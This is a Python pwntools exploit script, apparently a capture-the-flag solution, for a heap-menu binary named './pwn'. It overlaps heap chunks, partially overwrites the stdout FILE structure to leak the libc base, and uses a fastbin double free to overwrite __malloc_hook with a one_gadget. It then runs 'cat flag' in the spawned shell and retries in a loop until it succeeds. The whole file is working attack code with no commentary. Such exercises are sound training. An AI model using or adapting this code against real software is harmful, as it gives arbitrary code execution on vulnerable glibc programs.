from pwn import *
context(arch='amd64',os='linux',log_level='debug')
io = 0
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
flag = 0
def create(size,idx,name,choice=0):
	if choice == 0:
		io.recvuntil('choice >> \n')
		io.sendline('1')
		io.recvuntil('wlecome input your size of weapon: ')
		io.sendline(str(size))
		io.recvuntil('input index: ')
		io.sendline(str(idx))	
		io.recvuntil('input your name:\n')
		io.sendline(name)
	else:
		io.recvuntil('choice >> ')
		io.sendline('1')
		io.recvuntil('wlecome input your size of weapon: ')
		io.sendline(str(size))
		io.recvuntil('input index: ')
		io.sendline(str(idx))	
		io.recvuntil('input your name:')
		io.sendline(name)
	
def delete(idx,choice=0):
	if choice == 0:
		io.recvuntil('choice >> \n')
		io.sendline('2')
		io.recvuntil('input idx :')
		io.sendline(str(idx))
	else:
		io.recvuntil('choice >> ')
		io.sendline('2')
		io.recvuntil('input idx :')
		io.sendline(str(idx))
	
def rename(idx,content):
	io.recvuntil('choice >> \n')
	io.sendline('3')
	io.recvuntil('input idx: ')
	io.sendline(str(idx))
	io.recvuntil('new content:\n')
	io.send(content)

def main():
	global io
	io = process('./pwn')
	#io = remote('139.180.216.34',8888)
	create(0x10,0,p64(0)+p64(0x41))
	create(0x60,1,'a'*0x20+p64(0)+p64(0x41))
	create(0x30,2,'a')
	create(0x30,3,'a')
	create(0x30,4,'a')
	delete(1)
	delete(2)
	delete(3)
	rename(3,'\x10')
	create(0x30,3,'a')
	create(0x30,2,p64(0))
	rename(2,p64(0)+p64(0xb1))
	delete(1)
	rename(2,p64(0)+p64(0x71))
	rename(1,'\xdd\xa5')
	create(0x60,4,'')
	create(0x60,5,'')	#0xfbad1800
	rename(5,'aaa'+p64(0)*6+p64(0xfbad1800)+p64(0)*3+'\x00')
	io.recv(0x40)
	libc_base = u64(io.recv(8))-(0x7f35bc64a600-0x7f35bc285000)
	libc.address = libc_base
	log.success('libc base:'+hex(libc_base))
	one_gadget = libc_base + 0xf1147
	create(0x60,0,'a',1)
	create(0x60,1,'a',1)
	delete(0,1)
	delete(1,1)
	delete(0,1)
	create(0x60,0,p64(libc.symbols['__malloc_hook']-0x13),1)
	create(0x60,1,'a',1)
	create(0x60,1,'a',1)
	create(0x60,2,'a'*0x3+p64(one_gadget),1)
	io.sendline('1')
	io.sendline('2')
	io.sendline('3')
	io.sendline('cat flag')
	io.sendline('ls')
	io.interactive()
	
	

if __name__ == '__main__':
	while True:
		try:
			main()
			break
		except:
			io.kill()
			#io.close()
			continue
